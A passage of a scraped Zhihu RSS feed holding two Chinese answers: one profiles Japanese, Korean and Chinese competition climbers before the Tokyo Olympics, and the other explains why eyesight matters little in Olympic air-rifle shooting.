data-rawwidth=\"929\" data-rawheight=\"495\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>那么，为什么我要用内卷来形容日本队呢？</p>\n<p>那是因为攀岩奥运名额的问题。由于奥运攀岩比赛的选手人数只有男女各二十人，为了防止一边倒的局面，世界攀联规定，每个国家的名额上限，至多两男两女一共四位选手。</p>\n<p>由于Tomoa和Akiyo在2019年国际攀联世界杯的优异表现，他们各自锁定了一个奥运名额</p>\n<p>由于日本队是东道主，所以还能自动获得一男一女两个名额——事实上，我觉得日本队并不需要东道主这个便利，凭借接下来两位选手（男生Kai Harada和女生Miho Nonaka）的优异表现，也照样能够顺延获得两个奥运名额。</p>\n<p>然而，剩下的一众日本选手，尽管他们的实力可能还强于不少获得奥运资格的其他国家的一些选手，但是因为名额限制，只能遗憾无缘这次奥运。可以说，许多出色的日本攀岩选手们，有着和许多出色的中国乒乓球选手们，有着相似的痛苦。这次疫情之后，日本先于其他国家办起了国内锦标赛，由于比赛荒，日本锦标赛获得了全世界岩友们的空前关注。比赛水平之高，颇有几分我国乒乓球「直通里约热内卢」之类比赛的即视感。</p>\n<p>下面介绍一下一些日本选手：</p>\n<p>奥运选手：Akiyo Noguchi</p>\n<p>这次攀岩入奥，正好赶上了东京奥运会。在当年，得知攀岩有机会加入2020年奥运会之时，当仁不让日本的女子攀岩第一人，Akiyo Noguchi，积极参与了东京申奥的活动。Akiyo其实相对于攀岩选手来说，年纪已经不算轻，她之前也有过2020年之前就退役的打算。但是，在活动中她表示，只要东京获得了2020年奥运会的承办资格，她肯定会积极训练，备战2020东京奥运，在为国效力之后再退役。随着东京申办奥运的成功，Akiyo也实现了自己的梦想。在2018年开始的一系列比赛之中，Akiyo状态爆炸，不仅实现了第二春，并且成绩更胜往昔。早年Akiyo是以柔韧著称，经常出现脚比头高的极限挂脚动作，然而到了职业生涯末期，Akiyo进一步雕琢自己的风格，在动态动作方面取得了长足进步，从动态来说已经是稳稳的世界顶尖水准。然而疫情的降临，让东京奥运推迟至2021年，Akiyo的年龄也来到了31岁，在疫情后的比赛已经出现了明显的状态下滑，不禁让人唏嘘。希望她能够保持状态，能够在奥运比赛中取得理想的成绩。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2004f98c02e63c19d3bb47b02b015893_720w.jpg?rss\" data-caption=\"日本一姐Akiyo Noguchi在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"499\" data-watermark=\"watermark\" data-original-src=\"v2-2004f98c02e63c19d3bb47b02b015893\" data-watermark-src=\"v2-190d0b644211b55f1fa6fa91119df678\" data-private-watermark-src=\"v2-886f72bec4cb1719ef50b87a2e124927\"></p>\n<p>奥运选手：Tomoa Naarasaki</p>\n<p>日本一哥，动态之王，能够跳的时候绝对不静态，已经形成了自己鲜明的风格。其实Tomoa在户外攀岩的时候，其静态动作也是非常精准的，只是在竞技攀岩中，他选择了使用动态方法来完成而已。攀岩的先锋比赛有六分钟的时间限制，但是Tomoa无论能不能把线路爬完，基本上花费的时间都在三分钟以内，人狠话不多。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-4d00f33f0012a46c56e20d6c9d2c2424_720w.jpg?rss\" data-caption=\"Tomoa Naarasaki登顶后的标志性动作。图源：Japan Times\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1315\" data-watermark=\"watermark\" data-original-src=\"v2-4d00f33f0012a46c56e20d6c9d2c2424\" data-watermark-src=\"v2-cae801cafd39781888cc01e6bc11ee8e\" data-private-watermark-src=\"v2-c07c7fb8e0a18879f379181427c311ae\"></p>\n<p>奥运选手：Miho Nonaka</p>\n<p>Miho是当仁不让的日本女子攀岩第二人，跟Akiyo颇有一种「既生瑜，何生亮」的味道。除了在2018年世界攀联锦标赛拿了年度世界冠军（Akiyo是年度世界亚军），其余时候基本上是被Akiyo稳压一头（就连2018年也是拿了无数亚军屈居Akiyo之后在某一次比赛绝地翻盘）。坊间传言Miho和Akiyo，以及一些其他日本队成员的关系并没有很好，这点笔者没有特意求证，但是相比于日本队其他选手的其乐融融，Miho颇有种苦大愁深的味道，训练刻苦，甚至还号召日本民众给自己众筹了一个私人的速度攀岩赛道。相比其他选手Miho经常在Instagram发自己的训练视频，并且经常给自己打鸡血，灌鸡汤，不得不让人瑞斯拜。也希望Miho的努力能够取得回报。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2fcb9fbd06b4828bcd59ebcfcbbaafda_720w.jpg?rss\" data-caption=\"Miho Nonaka在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"463\" data-watermark=\"watermark\" data-original-src=\"v2-2fcb9fbd06b4828bcd59ebcfcbbaafda\" data-watermark-src=\"v2-ce96197fd0e3b257b3a7bbda6a06c6d0\" data-private-watermark-src=\"v2-06d4b7804cd10a398bec0a35cc653bca\"></p>\n<p>奥运遗珠：Futaba Ito</p>\n<p>Futaba是一位青少年选手——今年不过19岁。笔者从她16岁就开始关注了，是一位非常可爱的小姑娘。她一直是Akiyo的小跟班，其实也算是Akiyo的徒弟。相比Akiyo和Miho，Futaba多多少少有些稚气未脱，发挥时好时坏，在总成绩上比两位一姐二姐还是略显逊色。但是这两年随着成年，Futaba的力量也有了很大增长，整个人看上去大了一圈。等到Akiyo退役，相信Futaba通过也可以顺势上位，和Miho稳坐日本女队前两把交椅。不过日本年轻一代好手太多，也可能随着Akiyo的退役进入群雄割据的时代，未来如何就看Futaba自己的努力了。</p>\n<p><b>韩国队</b></p>\n<p><b>关键词：传承</b></p>\n<p>虽然比不上日本队可以对抗世界，但是韩国队绝对是亚洲范围乃至世界范围内的一支劲旅。其中有一个原因，是韩国队拥有全世界竞技攀岩第一人，或者说，世界攀联锦标赛成绩第一人，Jain Kim。是的，笔者在这里用了第一人这个词，并且没有加之一，没有限定性别。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2fd41eb66bb1344dc65fd8ba0e9239ac_720w.jpg?rss\" data-caption=\"最优雅的岩者之一，Jain Kim。图源：ifsc\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1638\" data-watermark=\"watermark\" data-original-src=\"v2-2fd41eb66bb1344dc65fd8ba0e9239ac\" data-watermark-src=\"v2-df376e60a73fba5a0c4454a3f0765391\" data-private-watermark-src=\"v2-4123e466184d054709a8b39646d45a2b\"></p>\n<p>Jain Kim在国际攀联世界杯共获得过多达三十次分站赛冠军，并且积分在2009年至2018之内从来没有掉出过世界前三，在2019/2013/2014获得过先锋攀登年度总冠军，在2010年和2015年获得过年度综合总冠军。这些成绩或许在未来会被人超越，比如Adam Ondra或者Janja Garnbret（时尚上Janja已经拥有了更多年度综合总冠军，但是在分站赛冠军数量上远远够不上Jain的级别。），但至少在目前Jain的成绩还是独霸天下。</p>\n<p>除开成绩这些冰冷的数字本身，Jain更为大家所知的，是她的攀爬技巧。几乎所有的岩友在刚开始接触攀岩的时候，都或多或少被告知要看Jain Kim的视频学习。Jain Kim技术动作丰富，攀爬节奏行云流水，脚点放置和手点抓握精准，无论从哪个角度来看都是教科书一般的存在，非常适合新手的学习。</p>\n<p>Jain和Akiyo同岁，在世界赛场上互相较量多年。早年Jain一直压制着Akiyo，直到近年来Akiyo开发出动态，以及世界比赛抱石定线风格越来越偏向跑酷风以后，Jain的风头才渐渐褪去。即便如此，在先锋攀登的比赛中，Jain仍然是稳定的决赛圈选手，并且还是可以力压群雄拿下冠军。只是Jain本身的风格并不动态，在现在的抱石比赛中非常吃亏，有的时候连半决赛都只能勉强进入，所以一定程度拖累了综合成绩。</p>\n<p>Jain也有奥运梦想，在年度积分上没有优势的她，决定冲击一下2020年亚洲锦标赛，因为2020年亚洲锦标赛的冠军还是可以获得一个奥运名额。然而造化弄人，因为新冠疫情，2020年亚洲锦标赛不得不取消，由于时间紧急，世界攀联选择了顺沿积分最高的选手递补，Jain遗憾无缘奥运。可喜的是，Jain在奥运希望破灭之后选择了和自己结婚多年的老公要了一个孩子，今年刚刚出生，一家人共享天伦之乐。笔者还是真诚地希望以后能在国际赛场上见到Jain，但是如果Jain就此退役，对她的人生也未必不是一件好事。</p>\n<p>有趣的是，世界攀联顺沿递补的一男一女两个奥运名额，都落在了韩国选手的囊中——男选手是Jong-won Chon，女选手则是Chae-hyun Seo。</p>\n<p>Chae-hyun Seo今年才十七岁，刚出道时被誉为韩国天才少女，而且她从小是看着Jain的比赛长大的，并且拥有一个叫“小Jain Kim”的外号。两人是忘年之交，也经常一起训练，Jain甚至也在第一时间把自己怀孕的消息跟Chae-hyun分享。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f884e7e75c1af6486c4bd8b66dfe225_720w.jpg?rss\" data-caption=\"Chae-hyun Seo在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"457\" data-watermark=\"watermark\" data-original-src=\"v2-5f884e7e75c1af6486c4bd8b66dfe225\" data-watermark-src=\"v2-be9623cc33efa79c1c2492a22d9ae051\" data-private-watermark-src=\"v2-d592125a0e64349ae65ea672445d1513\"></p>\n<p>Chae-hyun在十四岁的时候拿下了户外5.14d（科罗拉多州的Bad Girls Club）的好成绩，震惊了全世界。在2019年刚刚适龄参加世界攀联锦标赛，就在六次先锋攀登比赛中拿下4金1银1铜的好成绩，力压Janja成为年度的先锋攀登冠军。Chae-hyun和Jain Kim技术风格类似，在抱石比赛中也没有很大优势，想要真正称霸世界还有一段路要走。</p>\n<p>另一名值得一提的韩国选手是男队的Jong-won Chon，同样也获得了奥运名额。相比其他精英男选手，Jong-won Chon本身非常偏瘦，BMI值甚至只有17点几，是营养不良的标准。但是Jong-won Chon最大的优势在于指力强劲，并且在2015年和2017年都拿到过抱石的年度总冠军，近年来也都是抱石比赛决赛圈的常客。笔者深刻怀疑Jong-won属于怎么吃都吃不胖的体型，因为他声称自己最爱吃的就是汉堡，并且称汉堡为“强者的食物”。奥运赛场上，Jong-won的竞争对手有很多，除开两位日本选手以外，捷克之王Adam Ondra无疑也是最大威胁。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-501e5729fef8ba657458d6aa3589a35b_720w.jpg?rss\" data-caption=\"Jong-won Chong在比赛中。可以看出，他的身材非常精瘦。图源：Gettyimages\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"904\" data-watermark=\"watermark\" data-original-src=\"v2-501e5729fef8ba657458d6aa3589a35b\" data-watermark-src=\"v2-36e39e004bc245fad2ab3753fca0c917\" data-private-watermark-src=\"v2-390070b72bf892baa945234c2c7fe5fd\"></p>\n<p>相比韩国女队，韩国男队的后备力量要相对薄弱一些，在韩国全国比赛中，只要Jong-won不打盹，抱石冠军绝对没跑，先锋决赛也是毫无悬念。在培养后继巨星方面，韩国男队还需要努力。</p>\n<p><b>中国队</b></p>\n<p><b>关键词：希望</b></p>\n<p>相比日本和韩国两国，中国队目前的实力无疑是比较薄弱的。这个情况跟往前四五十年的中国围棋情况非常相似：中国向日韩努力学习，尤其日本。</p>\n<p>抱石目前是中国队在国际赛场上最需要提高的一项。和日本队以及韩国队选手经常是世界攀联锦标赛决赛的常客不同，中国队的队员往往需要在预选赛中超水平发挥才可以进入半决赛，然而在半决赛中往往也处于后半梯队，很难争取到一个决赛名额。</p>\n<p>先锋攀登方面，中国队要好一些。攀岩入奥以后，国家开始重视，开始有意培养攀岩选手，攀岩也在人民群众中开始普及，作为地大物博的国家自然有天才少年出现。中国选手在先锋攀登的世界攀联锦标赛中，已经能比较稳定地锁定半决赛名额，而且也能经常在决赛看到我们中国选手的身影。</p>\n<p>下面这个表格是2019年世界攀联锦标赛先锋攀登比赛各个分站赛的决赛成员，包含男女组。其中的两位中国选手我用红色标记出来了。这里日本队仍然是绿色，韩国队使用蓝青色，我们可以再次看到日本队可怕的统治力，以及2019年韩国天才少女Chae-hyun在先锋攀登中的优异表现：</p>\n<p>IFSC Lead Finalist in 2019 - Men &amp; Women </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c9ff3c27111d54fcda4a678b8659eb0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1105\" data-rawheight=\"587\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在表格里面出现的这两位中国选手，就是我们国家自己的两位天才少年：潘愚非和张悦彤。其中，潘愚非成功拿到了奥运资格，张悦彤由于在预选赛后期遭遇伤病以及新冠疫情改制等原因无缘这次奥运。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4be21644e4af673c6b9d5976a9761aec_720w.jpg?rss\" data-caption=\"潘愚非在比赛中。\" data-size=\"normal\" data-rawwidth=\"1153\" data-rawheight=\"1729\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运选手：潘愚非</p>\n<p>笔者有一位在华南理工上大学的朋友。他在大学期间接触了攀岩，而且学校里就有攀岩馆，氛围非常好。而在攀岩馆内，爬得最好的并不是华南理工校队的成员，而是一位十岁的孩子——这位孩子，就是现在的潘愚非。</p>\n<p>潘愚非开始训练攀岩的理由，其实跟许多岩友有着相似之处。潘愚非从小体质弱，而且并不是很喜欢具有激烈身体对抗的体育活动，因此选择了攀岩。攀岩从来不是岩者跟岩者之间的较量，而永远是岩者跟岩壁之间的较量。潘愚非不断精进自己，改进自己的攀爬技术，补全自己的短板。</p>\n<p>在2017年的国际攀联锦标赛厦门站中，潘愚非就获得了男子先锋攀登的第三名，这是中国队第一次在先锋攀登站上领奖台。而在上图的2019年的国际攀联锦标赛Villars站中，潘愚非更是再一次取得了突破，获得了男子先锋攀登的第二名，并且锁定了一张奥运会入场券。这次奥运因为疫情延期，使得他更有机会能够继续锤炼自己，以求能在奥运赛场上取得更大的突破。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7f7444793dd9a63e0e8d20bc2f900390_720w.jpg?rss\" data-caption=\"张悦彤在比赛中。\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运遗珠：张悦彤</p>\n<p>如果说韩国拥有自己的天才少女Chae-hyun Seo的话，那么我们中国也有自己的天才少女，张悦彤（彤彤）。</p>\n<p>彤彤在深圳出生长大，从小就开始学习攀岩。在2012年开始参加全国青年攀岩锦标赛，就拿下该年龄段的先锋和速度冠军，并且完成四连霸。尽管在国内已经战绩显赫，但是彤彤在2018年才真正站到国际赛场，参加了国际攀联世界青年锦标赛，在16-17岁组获得了抱石比赛第五名，先锋攀登第三名的好成绩，可谓是出道就是高起点，相比Chae-hyu那也不遑多让。接着在2019年彤彤就开始参加了成年组的比赛取得了一次亚军，一次第六名，和一次第七名的好成绩。尽管目前在成绩上相比韩国天才选手Chae-hyun，以及日本小将Natsuki Tanii稍逊，但是未来的路还很长，彤彤的前景也很光明，我们完全有理由相信这三位选手在未来在亚洲和世界赛场上大放异彩，成为中日韩女子攀岩界的一时瑜亮。很有趣的是，这三位女孩子的私交也非常好，可以看到Instagram上她们经常的互相留言点赞。相信随着未来越来越多的世界攀联比赛以及奥运比赛，我们能更多地看到她们一起出现在国际赛场上。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3bb4a10e3c0bcfaa668edd335cf19e08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"597\" data-watermark=\"watermark\" data-original-src=\"v2-3bb4a10e3c0bcfaa668edd335cf19e08\" data-watermark-src=\"v2-3bd063b675312b8de5584fd4c8ff130b\" data-private-watermark-src=\"v2-7966abfc730a45b1d2b76f847d889f62\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-04a1bf0e8229b642e44aa87c76b4e74d_720w.jpg?rss\" data-caption=\"分别是Chae-hyun和彤彤在2019年国际攀联世界杯Briancon站之后的社交媒体截图。两位小姑娘私底下是很好的朋友，经常在社交媒体互动。\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-04a1bf0e8229b642e44aa87c76b4e74d\" data-watermark-src=\"v2-65825b16f90050585a2daa6e71bdba23\" data-private-watermark-src=\"v2-6e9ccb69962552faf569044c35272581\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liang-wei-93-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梁维</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">152 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265963316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问滑板,滑雪跟冲浪这3种运动在学习或者滑行时有什么共同点跟不同点呢？</a><br><a href=\"http://www.zhihu.com/question/20535362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冲浪运动有哪些需要注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"奥运神射手许海峰视力不足 0.5，张梦圆近视 600 度，近视也可以练射击吗？他们是如何看清靶子的？","date":"2021-08-04 06:30:10","description":"\n<p>对于射击运动来说，<b>视力远没有多数人想象的那么重要</b>。</p>\n<p>普通人无法看清的靶纸，<b>很多射击运动员同样无法看清</b>。</p>\n<p><br></p>\n<p>因为一来靶纸那么小、距离那么远，已经超过人类视力的极限。最后的结果是，大家都看的不是很清……二来即便存在“千里眼”看得清清楚楚，如果无法做到动作稳定、且心态平静的完成射击，依然无法实现目标。</p>\n<p>毕竟射击向来比的不是谁看的最准，甚至不是比谁射击的技术，而是<b>比谁心理更沉着，动作更「稳」。</b></p>\n<p>——所以射击选手花了大量的时间，都用来训练抗压能力/心理负荷和稳定性。包括所有射击项目用到的道具，射击服、射击鞋等，主要的作用也都是提高稳定性、降低干扰。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c643d3516909f50d1d150d0d3f109ff5_720w.jpg?rss\" data-rawwidth=\"2070\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"面部肌肉颤抖对气步枪射击而言是很要命的\" data-watermark=\"watermark\" data-original-src=\"v2-c643d3516909f50d1d150d0d3f109ff5\" data-watermark-src=\"v2-d22620a066be6bef3d56c20526e96c41\" data-private-watermark-src=\"v2-7912020596079aa8a2371c85c99c22ba\"></p>\n<p><br></p>\n<p>之前和射击队的聊过，其中两点记忆犹新。</p>\n<p>打气步枪射击的，别管平时表情多么搞怪面部动作丰富，射击时<b>控制面部肌肉颤抖的能力</b>相当重要（实际上很多身体的细微动作并不受主观控制，这是与生俱来的天赋）；</p>\n<p>另外别看射击运动员比赛中每个动作那么稳、甚至视觉上动作表现的很程序化很僵化，其实他们的身体动作非常柔和（笨重的射击服也限制了活动），射击运动员在所有奥运运动员里，可能具备最强的<b>姿势模仿能力</b>。</p>\n<p>这个姿势模仿能力，也是选拔潜力小射击运动员的重要标准之一。</p>\n<hr>\n<p>多放一些射击相关的设备和数据，对视力和射击这件事理解就能直观很多。</p>\n<p>也就能明白为什么说，<b>视力其实压根不是决定最终成绩的关键因素。</b></p>\n<p><br></p>\n<p>奥运射击分为两类，固定靶射击（气步枪、气手枪）和飞碟移动靶射击（双管霰弹枪）。固定靶射击里最短距离10米，固定射击位+固定靶纸。</p>\n<p>找了三张十米气步枪比赛的照片，注意距离十米远的靶纸上的黑点（很小）：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a61f8162d4b1bd096dc7942c67860ab5_720w.jpg?rss\" data-rawwidth=\"2068\" data-rawheight=\"1378\" data-size=\"normal\" data-caption=\"今年东京奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a61f8162d4b1bd096dc7942c67860ab5\" data-watermark-src=\"v2-04076c7997de43b7adac7cb13d7977ca\" data-private-watermark-src=\"v2-7885c1609907d9fbbc2c27fa1da5f846\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a4cb5aa17f6632d222c705317c8f7265_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1704\" data-size=\"normal\" data-caption=\"2016年里约奥运的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a4cb5aa17f6632d222c705317c8f7265\" data-watermark-src=\"v2-3c02bed2538609bbf8e492d3681331c5\" data-private-watermark-src=\"v2-5f89e586b5334924063012f4185f2d8d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9cac32d063d8374716ffab1c95267511_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1549\" data-size=\"normal\" data-caption=\"2000年悉尼奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-9cac32d063d8374716ffab1c95267511\" data-watermark-src=\"v2-8469af387e0691cf35d4df11e2d637b8\" data-private-watermark-src=\"v2-7c6c8ebe760527eea40a0e92334fe7a0\"></p>\n<p><br></p>\n<p>照片里几乎看不清的黑点，长这样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-eaf94c752fa453778bc1987930996d2c_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eaf94c752fa453778bc1987930996d2c\" data-watermark-src=\"v2-8a2619bc981a92ee5f9f28bf32242672\" data-private-watermark-src=\"v2-a679d212cca1a4df698389a272e42f22\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4175a56120392ec9877508723ef3af55_720w.jpg?rss\" data-rawwidth=\"1552\" data-rawheight=\"1076\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4175a56120392ec9877508723ef3af55\" data-watermark-src=\"v2-56b2fc38e9976aea65b0218e84a5226c\" data-private-watermark-src=\"v2-0256b89d60a6d5af0f2c05725943228c\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-40b7fe38af87ce013d3e0e91788901fa_720w.jpg?rss\" data-rawwidth=\"1286\" data-rawheight=\"316\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40b7fe38af87ce013d3e0e91788901fa\" data-watermark-src=\"v2-cf37a8b562b4c4b203cbadafbb293093\" data-private-watermark-src=\"v2-6d8832082ddd19bedcbfd10c7c91d51e\"></p>\n<p>具体尺寸为：</p>\n<blockquote>总直径= 45.5mm； <br>4 环直径=30.5mm；<br>9 环直径=5.5mm； <br>10 环Ø=0.5mm；<br>划线宽度0.1mm至0.2mm</blockquote>\n<p><br></p>\n<p>就这么点大，且那么远。</p>\n<p><b>想要看清靶纸上的7～10环区，对人类的视觉而言几乎就已经是不可能的任务。</b></p>\n<p><b>而想靠眼睛去区分更细微的、能决定选手成绩的*.*环，更是完全天方夜谭。</b></p>\n<p>如果普通人有机会尝试一下10米气步枪射击，能打中靶纸，已经是相当不错的结果了。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-940b24ca888bd0b71925a8532d7c7a31_720w.jpg?rss\" data-rawwidth=\"1442\" data-rawheight=\"964\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-940b24ca888bd0b71925a8532d7c7a31\" data-watermark-src=\"v2-a0f9ebfc3f065605f3c0d5fa133b0cd0\" data-private-watermark-src=\"v2-63d079f33da8abcce3f15b691eec14ac\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2de532b30c98113a4747581ff6aad381_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"这张仅供参考尺寸\" data-watermark=\"watermark\" data-original-src=\"v2-2de532b30c98113a4747581ff6aad381\" data-watermark-src=\"v2-ebb5e1269be41afeba9df52198af1c70\" data-private-watermark-src=\"v2-ce53ad360730d4edb0d7eb7f783a7a40\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-12f29d42fea4a50e6ffa1eff3e3f24a6_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"和奥运会使用的靶纸较为类似的装置。通过滚轴更换单次射击的靶纸。\" data-watermark=\"watermark\" data-original-src=\"v2-12f29d42fea4a50e6ffa1eff3e3f24a6\" data-watermark-src=\"v2-fcd2d8ae4234b037679cf38d7c50174c\" data-private-watermark-src=\"v2-0b8fbb17806fdc12eda7ffb7aef8f44b\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4c918094ff8d050c877ffcd3f5c60dd8_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"932\" data-size=\"normal\" data-caption=\"相比之下，气手枪的靶纸就要比气步枪大得多。二者在射击器材、射击方式的精准性和稳定性上也有明显的差异\" data-watermark=\"watermark\" data-original-src=\"v2-4c918094ff8d050c877ffcd3f5c60dd8\" data-watermark-src=\"v2-7414622bcfa55c90c2b069f95cfda240\" data-private-watermark-src=\"v2-394c3ad916878ab9576b3d1413fa80a0\"></p>\n<p><br></p>\n<p>今年东京奥运会首金杨倩，女子十米气步枪，杨倩的最后一枪只有9.8环，发挥失常，她自己打完可能都以为冠军没戏了，然而俄罗斯的阿纳斯塔西娅·加拉希娜更是很失误的打了8.9环。最后一枪决出了胜负。</p>\n<p>杨倩：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-80e7e69eb62cae639ebbff4b94b3ef02_720w.jpg?rss\" data-rawwidth=\"1924\" data-rawheight=\"1014\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-80e7e69eb62cae639ebbff4b94b3ef02\" data-watermark-src=\"v2-91d717f99b06b47dd296b66129e4b9af\" data-private-watermark-src=\"v2-fd8ac62e4b3acfc5c111ebad8bb246d1\"></p>\n<p><br></p>\n<p>加拉希娜：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-227d2e5d4cae9e943493edfb1ba2084c_720w.jpg?rss\" data-rawwidth=\"1922\" data-rawheight=\"1026\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227d2e5d4cae9e943493edfb1ba2084c\" data-watermark-src=\"v2-f78e6f0a839bec800f4ce2eb795b7c2b\" data-private-watermark-src=\"v2-82b7c4c73680d5fca423ce4df88477ea\"></p>\n<p><br></p>\n<p>结合10米这个距离、这个小黑点，想象一下对她们而言大失水准的9.8环、8.9环，是什么概念。它们和各自最高的10.9环，位移的差异，又是怎样一个毫米数值。</p>\n<p>——<b>人类的视觉，精度完全没法达到这个水准。</b></p>\n<p>这种情况下，<b>视力度数的差异，影响也就没那么大了。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f1528de1e6d0c05c876c86a6368d4424_720w.jpg?rss\" data-rawwidth=\"700\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1528de1e6d0c05c876c86a6368d4424\" data-watermark-src=\"v2-6895316fe5dab70083838d6a063a6a89\" data-private-watermark-src=\"v2-52f7b16b73412f8f182b84f3f8d8e55f\"></p>\n<p><br></p>\n<p>所以开头才说，视力无法成为决定最终射击成绩关键因素，<b>心理负荷的调节能力</b>和<b>技术动作的稳定性</b>，才是最最最重要的。</p>\n<p>很多人提到杨倩，都知道她是00后，最近还在热议她颁奖时的比心动作、美甲图案、清华学生身份……这个2000年7月出生的姑娘，2011年已经开始射击训练、2012年就参加比赛了。</p>\n<p>这整整十年的专业训练中，心理一直是需要伴随技术同步训练的内容。集中的志趣定向、超强的自控力、坚忍的意志品质、进取心……缺一不可。</p>\n<p>区别其他项目，射击运动员往往要更荣辱不惊一些，尤其是在参加大赛的多个项目中，不管第一项是夺冠还是失败，都要求选手能尽量恢复到平常心的状态进入另一项——就这种能力的考验而言，整个奥运会项目中也很难找到第二个了。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6dadc2607e9cea38ddec2d870cb72ea6_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"1025\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6dadc2607e9cea38ddec2d870cb72ea6\" data-watermark-src=\"v2-43070ecdf793747cb5d1ffe9062e7d68\" 